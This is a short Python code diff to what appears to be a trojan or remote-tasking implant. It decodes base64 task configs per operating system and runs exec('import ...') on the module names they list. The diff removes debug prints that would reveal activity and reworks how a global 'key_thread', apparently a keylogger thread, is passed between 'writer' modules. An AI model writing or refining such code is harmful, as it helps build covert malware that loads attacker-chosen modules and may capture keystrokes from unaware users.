@@ -69,9 +69,7 @@ def get_process_config():
             exec("import %s" % task['module'])
 
     if platform.system() in ["Windows", "Darwin", "Linux"]:
-        print("%s.json" % platform.system().lower())
         config_json = get_file_contents("%s.json" % platform.system().lower())
-        print(config_json)
         aux_config = json.loads(base64.b64decode(config_json))
 
         for task in aux_config:
@@ -100,10 +98,9 @@ def store_module_result(data, module):
 def module_runner(module):
     global key_thread
     task_queue.put(1)
-    print("KEY THREAD : %s" % str(key_thread))
-    print("\n Module: %s \n" % module)
     if 'writer' in module:
-        result = sys.modules[module].run(thread=key_thread)
+        key_thread = sys.modules[module].run(thread=key_thread)
+        result = None
     elif module == 'thread':
         result = None
     else:
